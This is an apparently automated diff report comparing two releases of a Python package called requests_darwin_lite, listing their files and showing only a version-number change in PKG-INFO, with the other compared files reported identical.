# Comparing `tmp/requests_darwin_lite-2.27.2.tar.gz` & `tmp/requests_darwin_lite-2.28.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "requests_darwin_lite-2.27.2.tar", last modified: Fri May 10 14:21:29 2024, max compression
+gzip compressed data, was "requests_darwin_lite-2.28.0.tar", last modified: Fri May 10 14:19:53 2024, max compression
```

## Comparing `requests_darwin_lite-2.27.2.tar` & `requests_darwin_lite-2.28.0.tar`

### file list

```diff
@@ -1,87 +1,87 @@
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.959761 requests_darwin_lite-2.27.2/
--rw-r--r--   0 carlos     (501) staff       (20)    57285 2024-05-10 13:36:22.000000 requests_darwin_lite-2.27.2/HISTORY.md
--rw-r--r--   0 carlos     (501) staff       (20)    10142 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/LICENSE
--rw-r--r--   0 carlos     (501) staff       (20)      132 2024-05-09 14:52:37.000000 requests_darwin_lite-2.27.2/MANIFEST.in
--rw-r--r--   0 carlos     (501) staff       (20)       24 2024-05-10 13:34:56.000000 requests_darwin_lite-2.27.2/NOTICE
--rw-r--r--   0 carlos     (501) staff       (20)     4287 2024-05-10 14:21:29.959653 requests_darwin_lite-2.27.2/PKG-INFO
--rw-r--r--   0 carlos     (501) staff       (20)     2596 2024-05-10 13:34:40.000000 requests_darwin_lite-2.27.2/README.md
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.910704 requests_darwin_lite-2.27.2/docs/
--rw-r--r--   0 carlos     (501) staff       (20)        1 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/.nojekyll
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.927104 requests_darwin_lite-2.27.2/docs/_static/
--rw-r--r--   0 carlos     (501) staff       (20)     2990 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/_static/custom.css
--rw-r--r--   0 carlos     (501) staff       (20) 17393128 2024-05-09 07:24:24.000000 requests_darwin_lite-2.27.2/docs/_static/requests-sidebar-large.png
--rw-r--r--   0 carlos     (501) staff       (20)   306086 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/_static/requests-sidebar.png
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.930677 requests_darwin_lite-2.27.2/docs/_templates/
--rw-r--r--   0 carlos     (501) staff       (20)     2083 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/_templates/hacks.html
--rw-r--r--   0 carlos     (501) staff       (20)     1266 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/_templates/sidebarintro.html
--rw-r--r--   0 carlos     (501) staff       (20)     1144 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/_templates/sidebarlogo.html
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.931109 requests_darwin_lite-2.27.2/docs/_themes/
--rw-r--r--   0 carlos     (501) staff       (20)       22 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/_themes/.gitignore
--rw-r--r--   0 carlos     (501) staff       (20)     4875 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/_themes/flask_theme_support.py
--rw-r--r--   0 carlos     (501) staff       (20)     7330 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/api.rst
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.933209 requests_darwin_lite-2.27.2/docs/community/
--rw-r--r--   0 carlos     (501) staff       (20)     3641 2024-05-10 13:36:09.000000 requests_darwin_lite-2.27.2/docs/community/faq.rst
--rw-r--r--   0 carlos     (501) staff       (20)      620 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/community/out-there.rst
--rw-r--r--   0 carlos     (501) staff       (20)     2174 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/community/recommended.rst
--rw-r--r--   0 carlos     (501) staff       (20)     2066 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/community/release-process.rst
--rw-r--r--   0 carlos     (501) staff       (20)      846 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/community/support.rst
--rw-r--r--   0 carlos     (501) staff       (20)      322 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/community/updates.rst
--rw-r--r--   0 carlos     (501) staff       (20)     4750 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/community/vulnerabilities.rst
--rw-r--r--   0 carlos     (501) staff       (20)    12208 2024-05-10 13:38:01.000000 requests_darwin_lite-2.27.2/docs/conf.py
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.933814 requests_darwin_lite-2.27.2/docs/dev/
--rw-r--r--   0 carlos     (501) staff       (20)       48 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/dev/authors.rst
--rw-r--r--   0 carlos     (501) staff       (20)     6358 2024-05-10 13:38:05.000000 requests_darwin_lite-2.27.2/docs/dev/contributing.rst
--rw-r--r--   0 carlos     (501) staff       (20)     3453 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/index.rst
--rw-r--r--   0 carlos     (501) staff       (20)     7253 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/make.bat
--rw-r--r--   0 carlos     (501) staff       (20)       87 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/requirements.txt
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.936521 requests_darwin_lite-2.27.2/docs/user/
--rw-r--r--   0 carlos     (501) staff       (20)    41932 2024-05-10 13:37:44.000000 requests_darwin_lite-2.27.2/docs/user/advanced.rst
--rw-r--r--   0 carlos     (501) staff       (20)     5400 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/user/authentication.rst
--rw-r--r--   0 carlos     (501) staff       (20)     1038 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/user/install.rst
--rw-r--r--   0 carlos     (501) staff       (20)    19018 2024-04-23 17:50:19.000000 requests_darwin_lite-2.27.2/docs/user/quickstart.rst
--rw-r--r--   0 carlos     (501) staff       (20)      257 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/pyproject.toml
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.948797 requests_darwin_lite-2.27.2/requests/
--rw-r--r--   0 carlos     (501) staff       (20)     4964 2024-05-10 13:36:08.000000 requests_darwin_lite-2.27.2/requests/__init__.py
--rw-r--r--   0 carlos     (501) staff       (20)      455 2024-05-10 14:21:24.000000 requests_darwin_lite-2.27.2/requests/__version__.py
--rw-r--r--   0 carlos     (501) staff       (20)     1495 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/_internal_utils.py
--rw-r--r--   0 carlos     (501) staff       (20)    19553 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/adapters.py
--rw-r--r--   0 carlos     (501) staff       (20)     6431 2024-05-10 13:35:36.000000 requests_darwin_lite-2.27.2/requests/api.py
--rw-r--r--   0 carlos     (501) staff       (20)    10187 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/auth.py
--rw-r--r--   0 carlos     (501) staff       (20)      429 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/certs.py
--rw-r--r--   0 carlos     (501) staff       (20)     1451 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/compat.py
--rw-r--r--   0 carlos     (501) staff       (20)    18560 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/cookies.py
--rw-r--r--   0 carlos     (501) staff       (20)     3811 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/exceptions.py
--rw-r--r--   0 carlos     (501) staff       (20)     3875 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/help.py
--rw-r--r--   0 carlos     (501) staff       (20)      733 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/hooks.py
--rw-r--r--   0 carlos     (501) staff       (20)    35223 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/models.py
--rw-r--r--   0 carlos     (501) staff       (20)      957 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/packages.py
--rw-r--r--   0 carlos     (501) staff       (20)    30373 2023-05-22 15:11:02.000000 requests_darwin_lite-2.27.2/requests/sessions.py
--rw-r--r--   0 carlos     (501) staff       (20)     4235 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/status_codes.py
--rw-r--r--   0 carlos     (501) staff       (20)     2912 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/structures.py
--rw-r--r--   0 carlos     (501) staff       (20)    33448 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requests/utils.py
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.959007 requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/
--rw-r--r--   0 carlos     (501) staff       (20)     4287 2024-05-10 14:21:29.000000 requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/PKG-INFO
--rw-r--r--   0 carlos     (501) staff       (20)     1731 2024-05-10 14:21:29.000000 requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/SOURCES.txt
--rw-r--r--   0 carlos     (501) staff       (20)        1 2024-05-10 14:21:29.000000 requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/dependency_links.txt
--rw-r--r--   0 carlos     (501) staff       (20)        1 2024-05-10 13:38:22.000000 requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/not-zip-safe
--rw-r--r--   0 carlos     (501) staff       (20)      160 2024-05-10 14:21:29.000000 requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/requires.txt
--rw-r--r--   0 carlos     (501) staff       (20)        9 2024-05-10 14:21:29.000000 requests_darwin_lite-2.27.2/requests_darwin_lite.egg-info/top_level.txt
--rw-r--r--   0 carlos     (501) staff       (20)      250 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/requirements-dev.txt
--rw-r--r--   0 carlos     (501) staff       (20)      360 2024-05-10 14:21:29.960121 requests_darwin_lite-2.27.2/setup.cfg
--rwxr-xr-x   0 carlos     (501) staff       (20)     5106 2024-05-10 14:21:13.000000 requests_darwin_lite-2.27.2/setup.py
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.957817 requests_darwin_lite-2.27.2/tests/
--rw-r--r--   0 carlos     (501) staff       (20)      469 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/__init__.py
--rw-r--r--   0 carlos     (501) staff       (20)      480 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/compat.py
--rw-r--r--   0 carlos     (501) staff       (20)     1581 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/conftest.py
--rw-r--r--   0 carlos     (501) staff       (20)      808 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/test_help.py
--rw-r--r--   0 carlos     (501) staff       (20)      424 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/test_hooks.py
--rw-r--r--   0 carlos     (501) staff       (20)    15348 2024-05-10 13:36:22.000000 requests_darwin_lite-2.27.2/tests/test_lowlevel.py
--rw-r--r--   0 carlos     (501) staff       (20)      229 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/test_packages.py
--rw-r--r--   0 carlos     (501) staff       (20)    98061 2024-05-10 13:36:22.000000 requests_darwin_lite-2.27.2/tests/test_requests.py
--rw-r--r--   0 carlos     (501) staff       (20)     2279 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/test_structures.py
--rw-r--r--   0 carlos     (501) staff       (20)     5553 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/test_testserver.py
--rw-r--r--   0 carlos     (501) staff       (20)    28254 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/test_utils.py
-drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:21:29.958609 requests_darwin_lite-2.27.2/tests/testserver/
--rw-r--r--   0 carlos     (501) staff       (20)        0 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/testserver/__init__.py
--rw-r--r--   0 carlos     (501) staff       (20)     3832 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/testserver/server.py
--rw-r--r--   0 carlos     (501) staff       (20)      366 2023-05-22 15:08:07.000000 requests_darwin_lite-2.27.2/tests/utils.py
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.843543 requests_darwin_lite-2.28.0/
+-rw-r--r--   0 carlos     (501) staff       (20)    57285 2024-05-10 13:36:22.000000 requests_darwin_lite-2.28.0/HISTORY.md
+-rw-r--r--   0 carlos     (501) staff       (20)    10142 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/LICENSE
+-rw-r--r--   0 carlos     (501) staff       (20)      132 2024-05-09 14:52:37.000000 requests_darwin_lite-2.28.0/MANIFEST.in
+-rw-r--r--   0 carlos     (501) staff       (20)       24 2024-05-10 13:34:56.000000 requests_darwin_lite-2.28.0/NOTICE
+-rw-r--r--   0 carlos     (501) staff       (20)     4287 2024-05-10 14:19:53.843434 requests_darwin_lite-2.28.0/PKG-INFO
+-rw-r--r--   0 carlos     (501) staff       (20)     2596 2024-05-10 13:34:40.000000 requests_darwin_lite-2.28.0/README.md
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.793368 requests_darwin_lite-2.28.0/docs/
+-rw-r--r--   0 carlos     (501) staff       (20)        1 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/.nojekyll
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.810067 requests_darwin_lite-2.28.0/docs/_static/
+-rw-r--r--   0 carlos     (501) staff       (20)     2990 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/_static/custom.css
+-rw-r--r--   0 carlos     (501) staff       (20) 17393128 2024-05-09 07:24:24.000000 requests_darwin_lite-2.28.0/docs/_static/requests-sidebar-large.png
+-rw-r--r--   0 carlos     (501) staff       (20)   306086 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/_static/requests-sidebar.png
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.813748 requests_darwin_lite-2.28.0/docs/_templates/
+-rw-r--r--   0 carlos     (501) staff       (20)     2083 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/_templates/hacks.html
+-rw-r--r--   0 carlos     (501) staff       (20)     1266 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/_templates/sidebarintro.html
+-rw-r--r--   0 carlos     (501) staff       (20)     1144 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/_templates/sidebarlogo.html
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.814231 requests_darwin_lite-2.28.0/docs/_themes/
+-rw-r--r--   0 carlos     (501) staff       (20)       22 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/_themes/.gitignore
+-rw-r--r--   0 carlos     (501) staff       (20)     4875 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/_themes/flask_theme_support.py
+-rw-r--r--   0 carlos     (501) staff       (20)     7330 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/api.rst
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.816295 requests_darwin_lite-2.28.0/docs/community/
+-rw-r--r--   0 carlos     (501) staff       (20)     3641 2024-05-10 13:36:09.000000 requests_darwin_lite-2.28.0/docs/community/faq.rst
+-rw-r--r--   0 carlos     (501) staff       (20)      620 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/community/out-there.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     2174 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/community/recommended.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     2066 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/community/release-process.rst
+-rw-r--r--   0 carlos     (501) staff       (20)      846 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/community/support.rst
+-rw-r--r--   0 carlos     (501) staff       (20)      322 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/community/updates.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     4750 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/community/vulnerabilities.rst
+-rw-r--r--   0 carlos     (501) staff       (20)    12208 2024-05-10 13:38:01.000000 requests_darwin_lite-2.28.0/docs/conf.py
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.816960 requests_darwin_lite-2.28.0/docs/dev/
+-rw-r--r--   0 carlos     (501) staff       (20)       48 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/dev/authors.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     6358 2024-05-10 13:38:05.000000 requests_darwin_lite-2.28.0/docs/dev/contributing.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     3453 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/index.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     7253 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/make.bat
+-rw-r--r--   0 carlos     (501) staff       (20)       87 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/requirements.txt
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.819691 requests_darwin_lite-2.28.0/docs/user/
+-rw-r--r--   0 carlos     (501) staff       (20)    41932 2024-05-10 13:37:44.000000 requests_darwin_lite-2.28.0/docs/user/advanced.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     5400 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/user/authentication.rst
+-rw-r--r--   0 carlos     (501) staff       (20)     1038 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/user/install.rst
+-rw-r--r--   0 carlos     (501) staff       (20)    19018 2024-04-23 17:50:19.000000 requests_darwin_lite-2.28.0/docs/user/quickstart.rst
+-rw-r--r--   0 carlos     (501) staff       (20)      257 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/pyproject.toml
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.831418 requests_darwin_lite-2.28.0/requests/
+-rw-r--r--   0 carlos     (501) staff       (20)     4964 2024-05-10 13:36:08.000000 requests_darwin_lite-2.28.0/requests/__init__.py
+-rw-r--r--   0 carlos     (501) staff       (20)      455 2024-05-10 14:19:36.000000 requests_darwin_lite-2.28.0/requests/__version__.py
+-rw-r--r--   0 carlos     (501) staff       (20)     1495 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/_internal_utils.py
+-rw-r--r--   0 carlos     (501) staff       (20)    19553 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/adapters.py
+-rw-r--r--   0 carlos     (501) staff       (20)     6431 2024-05-10 13:35:36.000000 requests_darwin_lite-2.28.0/requests/api.py
+-rw-r--r--   0 carlos     (501) staff       (20)    10187 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/auth.py
+-rw-r--r--   0 carlos     (501) staff       (20)      429 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/certs.py
+-rw-r--r--   0 carlos     (501) staff       (20)     1451 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/compat.py
+-rw-r--r--   0 carlos     (501) staff       (20)    18560 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/cookies.py
+-rw-r--r--   0 carlos     (501) staff       (20)     3811 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/exceptions.py
+-rw-r--r--   0 carlos     (501) staff       (20)     3875 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/help.py
+-rw-r--r--   0 carlos     (501) staff       (20)      733 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/hooks.py
+-rw-r--r--   0 carlos     (501) staff       (20)    35223 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/models.py
+-rw-r--r--   0 carlos     (501) staff       (20)      957 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/packages.py
+-rw-r--r--   0 carlos     (501) staff       (20)    30373 2023-05-22 15:11:02.000000 requests_darwin_lite-2.28.0/requests/sessions.py
+-rw-r--r--   0 carlos     (501) staff       (20)     4235 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/status_codes.py
+-rw-r--r--   0 carlos     (501) staff       (20)     2912 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/structures.py
+-rw-r--r--   0 carlos     (501) staff       (20)    33448 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requests/utils.py
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.842790 requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/
+-rw-r--r--   0 carlos     (501) staff       (20)     4287 2024-05-10 14:19:53.000000 requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/PKG-INFO
+-rw-r--r--   0 carlos     (501) staff       (20)     1731 2024-05-10 14:19:53.000000 requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/SOURCES.txt
+-rw-r--r--   0 carlos     (501) staff       (20)        1 2024-05-10 14:19:53.000000 requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/dependency_links.txt
+-rw-r--r--   0 carlos     (501) staff       (20)        1 2024-05-10 13:38:22.000000 requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/not-zip-safe
+-rw-r--r--   0 carlos     (501) staff       (20)      160 2024-05-10 14:19:53.000000 requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/requires.txt
+-rw-r--r--   0 carlos     (501) staff       (20)        9 2024-05-10 14:19:53.000000 requests_darwin_lite-2.28.0/requests_darwin_lite.egg-info/top_level.txt
+-rw-r--r--   0 carlos     (501) staff       (20)      250 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/requirements-dev.txt
+-rw-r--r--   0 carlos     (501) staff       (20)      360 2024-05-10 14:19:53.843902 requests_darwin_lite-2.28.0/setup.cfg
+-rwxr-xr-x   0 carlos     (501) staff       (20)     4113 2024-05-10 14:17:59.000000 requests_darwin_lite-2.28.0/setup.py
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.840552 requests_darwin_lite-2.28.0/tests/
+-rw-r--r--   0 carlos     (501) staff       (20)      469 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/__init__.py
+-rw-r--r--   0 carlos     (501) staff       (20)      480 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/compat.py
+-rw-r--r--   0 carlos     (501) staff       (20)     1581 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/conftest.py
+-rw-r--r--   0 carlos     (501) staff       (20)      808 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/test_help.py
+-rw-r--r--   0 carlos     (501) staff       (20)      424 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/test_hooks.py
+-rw-r--r--   0 carlos     (501) staff       (20)    15348 2024-05-10 13:36:22.000000 requests_darwin_lite-2.28.0/tests/test_lowlevel.py
+-rw-r--r--   0 carlos     (501) staff       (20)      229 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/test_packages.py
+-rw-r--r--   0 carlos     (501) staff       (20)    98061 2024-05-10 13:36:22.000000 requests_darwin_lite-2.28.0/tests/test_requests.py
+-rw-r--r--   0 carlos     (501) staff       (20)     2279 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/test_structures.py
+-rw-r--r--   0 carlos     (501) staff       (20)     5553 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/test_testserver.py
+-rw-r--r--   0 carlos     (501) staff       (20)    28254 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/test_utils.py
+drwxr-xr-x   0 carlos     (501) staff       (20)        0 2024-05-10 14:19:53.841353 requests_darwin_lite-2.28.0/tests/testserver/
+-rw-r--r--   0 carlos     (501) staff       (20)        0 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/testserver/__init__.py
+-rw-r--r--   0 carlos     (501) staff       (20)     3832 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/testserver/server.py
+-rw-r--r--   0 carlos     (501) staff       (20)      366 2023-05-22 15:08:07.000000 requests_darwin_lite-2.28.0/tests/utils.py
```

### Comparing `requests_darwin_lite-2.27.2/HISTORY.md` & `requests_darwin_lite-2.28.0/HISTORY.md`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/LICENSE` & `requests_darwin_lite-2.28.0/LICENSE`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/PKG-INFO` & `requests_darwin_lite-2.28.0/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: requests-darwin-lite
-Version: 2.27.2
+Version: 2.28.0
 Summary: Python HTTP for Humans.
 Home-page: https://requests.readthedocs.io
 Author: Maxim Davidson
 Author-email: unhurt.maxim0x@icloud.com
 License: Apache 2.0
 Project-URL: Documentation, https://requests.readthedocs.io
 Project-URL: Source, https://github.com/psf/requests
```

### Comparing `requests_darwin_lite-2.27.2/README.md` & `requests_darwin_lite-2.28.0/README.md`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/_static/custom.css` & `requests_darwin_lite-2.28.0/docs/_static/custom.css`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/_static/requests-sidebar-large.png` & `requests_darwin_lite-2.28.0/docs/_static/requests-sidebar-large.png`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/_static/requests-sidebar.png` & `requests_darwin_lite-2.28.0/docs/_static/requests-sidebar.png`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/_templates/hacks.html` & `requests_darwin_lite-2.28.0/docs/_templates/hacks.html`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/_templates/sidebarintro.html` & `requests_darwin_lite-2.28.0/docs/_templates/sidebarintro.html`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/_templates/sidebarlogo.html` & `requests_darwin_lite-2.28.0/docs/_templates/sidebarlogo.html`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/_themes/flask_theme_support.py` & `requests_darwin_lite-2.28.0/docs/_themes/flask_theme_support.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/api.rst` & `requests_darwin_lite-2.28.0/docs/api.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/community/faq.rst` & `requests_darwin_lite-2.28.0/docs/community/faq.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/community/out-there.rst` & `requests_darwin_lite-2.28.0/docs/community/out-there.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/community/recommended.rst` & `requests_darwin_lite-2.28.0/docs/community/recommended.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/community/release-process.rst` & `requests_darwin_lite-2.28.0/docs/community/release-process.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/community/support.rst` & `requests_darwin_lite-2.28.0/docs/community/support.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/community/vulnerabilities.rst` & `requests_darwin_lite-2.28.0/docs/community/vulnerabilities.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/conf.py` & `requests_darwin_lite-2.28.0/docs/conf.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/dev/contributing.rst` & `requests_darwin_lite-2.28.0/docs/dev/contributing.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/index.rst` & `requests_darwin_lite-2.28.0/docs/index.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/make.bat` & `requests_darwin_lite-2.28.0/docs/make.bat`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/user/advanced.rst` & `requests_darwin_lite-2.28.0/docs/user/advanced.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/user/authentication.rst` & `requests_darwin_lite-2.28.0/docs/user/authentication.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/user/install.rst` & `requests_darwin_lite-2.28.0/docs/user/install.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/docs/user/quickstart.rst` & `requests_darwin_lite-2.28.0/docs/user/quickstart.rst`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/__init__.py` & `requests_darwin_lite-2.28.0/requests/__init__.py`

 * *Files identical despite different names*

### Comparing `requests_darwin_lite-2.27.2/requests/_internal_utils.py` & `requests_darwin_lite-2.28.0/requests/_internal_utils.py`

 * *Files identical despite different names*

